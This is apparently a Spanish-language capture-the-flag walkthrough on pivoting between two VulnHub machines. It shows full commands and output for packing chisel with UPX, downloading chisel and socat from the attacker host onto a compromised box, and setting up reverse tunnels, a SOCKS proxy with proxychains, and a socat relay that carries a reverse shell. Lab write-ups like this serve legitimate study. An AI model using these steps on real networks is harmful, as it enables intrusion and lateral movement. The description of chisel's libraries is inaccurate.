# PIVOTING
---
## CHISEL
"Chisel" es una herramienta de red desarrollada por Jpillora, es un tunel de proxy TCP, construido sobre la librería de Go "github.com/aws/aws-sdk-go/aws" y "golang.org/x/net/websocket". Es una herramienta que permite conectarse a una red privada a través de una conexión a Internet pública. `chisel client [server-host] [local-port]:[remote-port]`
Reducción del tamaño de chisel.
```java
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/content]
└─# du -hc chisel
7,8M    chisel
7,8M    total                                                                                                                                                                                         
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/content]
└─# upx chisel 
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020
        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
   8077312 ->   3107968   38.48%   linux/amd64   chisel 
Packed 1 file.                                                                                                                                                                               
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/content]
└─# du -hc chisel   
3,0M    chisel
3,0M    total
```                            
Nos movemos a la carpeta /dev/shm "optional" y desde ahi descargarmos chisel y dar permisos de ejecución.
```java
bash-5.0#  pwd
/dev/shm
bash-5.0# wget 192.168.200.147/chisel
--2023-01-20 10:19:16--  http://192.168.200.147/chisel
Connecting to 192.168.200.147:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3107968 (3.0M) [application/octet-stream]
Saving to: ‘chisel’
chisel                                         100%[====================================================================================================>]   2.96M  --.-KB/s    in 0.07s   
2023-01-20 10:19:16 (45.2 MB/s) - ‘chisel’ saved [3107968/3107968]
bash-5.0# 
bash-5.0# ls -la
-rw-rw-r--  1 root randy 3107968 Jan 30  2022 chisel
bash-5.0# chmod +x chisel 
bash-5.0# ls -la
-rwxrwxr-x  1 root randy 3107968 Jan 30  2022 chisel
bash-5.0# 
```
Ejecutar chisel desde el servidor, recordar que se debe tener permisos de ejecución.
```java
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/content]
└─# ./chisel server --reverse -p 1234
2023/01/20 12:25:24 server: Reverse tunnelling enabled
2023/01/20 12:25:24 server: Fingerprint e/uTC7zOwR/RM4G/wjk+wrwIaSz0UQPLSrDsOZwfAi8=
2023/01/20 12:25:24 server: Listening on http://0.0.0.0:1234
```
Para establecer la conexion pivot desde el equipo `corrosion1`, se debe ejecutar chisel desde el equipo `corrosion2`, y establecer la conexion desde el equipo `192.168.210.129`; estableciendo la `ip:port` se peude hacer la reenvío del servicio publicado en el puerto 80.
```java
bash-5.0# ./chisel client 192.168.200.147:1234 R:80:192.168.210.129:80
2023/01/20 10:30:59 client: Connecting to ws://192.168.200.147:1234
2023/01/20 10:30:59 client: Connected (Latency 1.39229ms)
```
## PROXYCHAINS
Tambien se puede establecer la conexion para todas las comunicaciones desde el equipo corrosion1 mediante sock, redirigir todas las comunicaciones establecidas.
```java
bash-5.0# ./chisel client 192.168.200.147:1234 R:socks
2023/01/20 10:33:45 client: Connecting to ws://192.168.200.147:1234
2023/01/20 10:33:45 client: Connected (Latency 1.129892ms)
```
**Nota.-** Cuando se establece la comunicación mediante socks, se debe configurar la comunicacións `sokcs5` en el archivo `/etc/proxychains4.conf`.
```java
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4    127.0.0.1 9050
socks5  127.0.0.1 1080
```
## SOCAT
Considerando que no hay comunicación directa, debemos establecer un reenvío de comunicaciones desde el equipo corrosion1 al corrosion2 y de ahi al equipo atacante, para generar una shell reversa del equipo corrosion 1 al equipo atacante, utilizaremos [socats](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)
```java
┌──(root㉿kali)-[/home/…/CTF/vulnhub/corrosion2/content]
└─# wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
--2023-01-20 19:47:35--  https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
Resolviendo github.com (github.com)... 140.82.112.4
Conectando con github.com (github.com)[140.82.112.4]:443... conectado.
Petición HTTP enviada, esperando respuesta... 302 Found
```
Una vez descargado se lo puede importar a la maquina corrosion 2 utilizando un servidor web y descagando con wget, cabe recalcar que se debe establecer permisos de ejecución.
```java
bash-5.0# wget http://192.168.200.147:8888/socat
--2023-01-20 17:57:24--  http://192.168.200.147:8888/socat
Connecting to 192.168.200.147:8888... connected.
HTTP request sent, awaiting response... 200 OK
Length: 375176 (366K) [application/octet-stream]
Saving to: ‘socat’
socat   100%[====================================================================================================>] 366.38K  --.-KB/s    in 0.006s  
2023-01-20 17:57:24 (63.1 MB/s) - ‘socat’ saved [375176/375176]
bash-5.0# chmod +x socat 
```
Para establecer la comunicación mediante socats ponemos en escucha un puerto y toda la comnunicación que viene por ese puerto sea reenviado al equipo atacante.
```java
bash-5.0# ./socat TCP-LISTEN:4646,fork TCP:192.168.200.147:443
```